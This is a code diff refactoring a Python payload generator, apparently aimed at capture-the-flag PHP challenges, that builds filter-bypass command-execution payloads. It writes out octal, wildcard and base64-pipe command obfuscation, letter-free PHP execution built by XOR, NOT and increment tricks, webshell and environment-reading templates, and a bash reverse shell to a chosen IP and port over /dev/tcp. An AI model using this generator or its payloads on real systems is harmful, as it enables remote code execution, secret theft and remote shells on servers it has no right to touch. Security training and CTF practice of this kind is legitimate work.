@@ -16,92 +16,67 @@ class BypassOptions:
 
 
 def _octal_encode(command: str):
-    """
-    八进制
-    """
     encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
     return f"$'{encoded}'"
 
 
 def _wildcard_bypass(path: str):
-    """
-    通配符
-    """
     if not path or path == "/":
         return path
     parts = path.split("/")
     new_parts = []
-    for p in parts:
-        if len(p) > 1:
-            new_parts.append(p[0] + "?" * (len(p) - 1))
+    for part in parts:
+        if len(part) > 1:
+            new_parts.append(part[0] + "?" * (len(part) - 1))
         else:
-            new_parts.append(p)
+            new_parts.append(part)
     return "/".join(new_parts)
 
 
 def _base64_pipe_bypass(command: str):
-    """
-    变量拆分
-    """
     import base64
 
     b64_cmd = base64.b64encode(command.encode()).decode()
 
     assign_base64, concat_base64 = utils._split_string_to_vars("base64")
     assign_sh, concat_sh = utils._split_string_to_vars("sh")
-
     assign_echo, concat_echo = utils._split_string_to_vars("echo")
 
-    payload = f"{assign_base64}{assign_sh}{assign_echo} {concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"
-
-    return payload
+    return (
+        f"{assign_base64}{assign_sh}{assign_echo} "
+        f"{concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"
+    )
 
 
 def _generate_php_rce_payloads(command: str, php_version: float):
-    """
-    生成无字母数字
-    """
     payloads = []
 
     for template in bypass_data.BACKTICK_TEMPLATES:
         if "{path}" in template:
-            pass
-        else:
-            payloads.append(template.replace("{path}", command))
+            payloads.append(template.format(path=command))
 
     payloads.append(f"`{command}`")
 
-    wrappers = bypass_data.PHP_EXEC_WRAPPERS
-
-    for func in wrappers:
-        # 适用于 php7.0
+    for func in bypass_data.PHP_EXEC_WRAPPERS:
         if php_version >= 7.0:
             not_func = utils.generate_php_not(func)
             not_arg = utils.generate_php_not(command)
             if not_func and not_arg:
                 payloads.append(f"{not_func}({not_arg});")
 
-        # 异或构造
         xor_func = utils.generate_php_xor(func)
         xor_arg = utils.generate_php_xor(command)
         if xor_func and xor_arg:
-            # $_=...; $_(...);
-            var_func = "$_"
-            payloads.append(f"{var_func}={xor_func};{var_func}({xor_arg});")
+            payloads.append(f"$_={xor_func};$_({xor_arg});")
 
-        # 自增
         inc_func_code = utils.generate_php_increment(func)
-        inc_arg_code = utils.generate_php_increment(command)
-
-        if inc_func_code and inc_arg_code:
-            if xor_arg:
-                payloads.append(f"{inc_func_code};$_____({xor_arg});")
+        if inc_func_code and xor_arg:
+            payloads.append(f"{inc_func_code};$_____({xor_arg});")
 
     return payloads
 
 
 def _append_upload_exec_payloads(payloads):
-    # 最终验证包装
     payloads.extend(bypass_data.UPLOAD_EXEC_TEMPLATES)
     for cmd in bypass_data.UPLOAD_EXEC_TEMPLATES:
         for wrapper in bypass_data.UPLOAD_EXEC_WRAPPER_TEMPLATES:
@@ -110,45 +85,41 @@ def _append_upload_exec_payloads(payloads):
 
 def generate_candidates(options: BypassOptions):
     payloads = []
-
-    # 收集用于命令执行生成的目标命令
     target_cmd = None
+
+    root_discovery_mode = (
+        options.flagfile == "/"
+        and not options.read_env
+        and not options.reflect_shell
+        and not options.phpinfo
+    )
+
     if options.flagfile:
-        target_cmd = f"cat {options.flagfile}"
-
-        for template in bypass_data.READFILE_TEMPLATES:
-            # 原始路径
-            payloads.append(template.format(path=options.flagfile, keyword="flag"))
-            # 通配符路径
-            payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
-            # 转义路径
-            payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
-            # 引号路径
-            payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))
-
-        # 反引号 ``
-        for template in bypass_data.BACKTICK_TEMPLATES:
-            payloads.append(template.format(path=options.flagfile))
-
-        # 包含 include
-        for template in bypass_data.INCLUDE_TEMPLATES:
-            payloads.append(template.format(path=options.flagfile))
-
-        # 文件枚举
-        payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)
-        if options.flagfile == "/":
+        if root_discovery_mode:
             payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
+            payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
+        else:
+            target_cmd = f"cat {options.flagfile}"
+
+            for template in bypass_data.READFILE_TEMPLATES:
+                payloads.append(template.format(path=options.flagfile, keyword="flag"))
+                payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
+                payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
+                payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))
+
+            for template in bypass_data.BACKTICK_TEMPLATES:
+                payloads.append(template.format(path=options.flagfile))
+
+            for template in bypass_data.INCLUDE_TEMPLATES:
+                payloads.append(template.format(path=options.flagfile))
+
+            payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)
+            if options.flagfile == "/":
+                payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
 
     if options.read_env:
         payloads.extend(bypass_data.READ_ENV_TEMPLATES)
-
-        # 嵌套目录枚举
-        payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
-
         _append_upload_exec_payloads(payloads)
-
-        # 日志包含
-        payloads.extend(bypass_data.LOG_INCLUSION_TEMPLATES)
         target_cmd = "env"
 
     if options.reflect_shell:
@@ -156,8 +127,6 @@ def generate_candidates(options: BypassOptions):
             payloads.append(template.format(ip=options.ip, port=options.port))
 
         _append_upload_exec_payloads(payloads)
-
-        # 反弹shell
 
         shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{options.ip}/{options.port} 0>&1'"
         for template in bypass_data.WEBSHELL_TEMPLATES:
@@ -167,25 +136,20 @@ def generate_candidates(options: BypassOptions):
 
     if options.phpinfo:
         for template in bypass_data.PHPINFO_TEMPLATES:
-            if template.startswith("(") and template.endswith(");"):
-                # 对php版本进行判断
-                if options.php_version < 7.0:
-                    continue
+            if template.startswith("(") and template.endswith(");") and options.php_version < 7.0:
+                continue
             payloads.append(template)
-        target_cmd = "phpinfo" 
+        target_cmd = "phpinfo"
 
-    # Header 链利用
     if options.read_env or options.phpinfo:
         payloads.extend(bypass_data.HEADER_EXEC_TEMPLATES)
 
-    # 变量劫持
     if options.reflect_shell or options.phpinfo:
         payloads.extend(bypass_data.VARIABLE_HIJACK_TEMPLATES)
 
     if target_cmd:
         payloads.append(bypass_data.NON_ALNUM_ASSERT_POST_PAYLOAD)
         if target_cmd == "phpinfo":
-            # 自增
             inc_code = utils.generate_php_increment("phpinfo")
             if inc_code:
                 payloads.append(f"{inc_code};$_____();")
@@ -194,33 +158,29 @@ def generate_candidates(options: BypassOptions):
                 not_code = utils.generate_php_not("phpinfo")
                 payloads.append(f"{not_code}();")
         else:
-            rce_payloads = _generate_php_rce_payloads(target_cmd, options.php_version)
-            payloads.extend(rce_payloads)
+            payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))
 
     current_payloads = payloads.copy()
-    for p in current_payloads:
-        if ";" in p or "(" in p or "$_" in p:
+    for payload in current_payloads:
+        if ";" in payload or "(" in payload or "$_" in payload:
             for tag_tmpl in bypass_data.SHORT_TAG_TEMPLATES:
-                payloads.append(tag_tmpl.format(payload=p))
+                payloads.append(tag_tmpl.format(payload=payload))
 
-    # 对当前已生成载荷应用编码管道绕过
     base_payloads = payloads.copy()
-    for p in base_payloads:
-        # 仅作用于命令字符串
-        if ";" not in p and "(" not in p:
-            payloads.append(_base64_pipe_bypass(p))
+    for payload in base_payloads:
+        if ";" not in payload and "(" not in payload:
+            payloads.append(_base64_pipe_bypass(payload))
 
-    # 八进制编码
-    simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
-    for cmd in simple_cmds:
-        payloads.append(_octal_encode(cmd))
+    if not root_discovery_mode:
+        simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
+        for cmd in simple_cmds:
+            payloads.append(_octal_encode(cmd))
 
-    # 空格 bypass
     candidates = payloads.copy()
-    for p in payloads:
-        if " " in p:
+    for payload in payloads:
+        if " " in payload:
             for template in bypass_data.SPACE_BYPASS_TEMPLATES:
-                candidates.append(template.format(payload=p))
+                candidates.append(template.format(payload=payload))
 
     candidates = utils.dedupe_preserve_order(candidates)
     candidates = [payload for payload in candidates if payload != "`/`"]
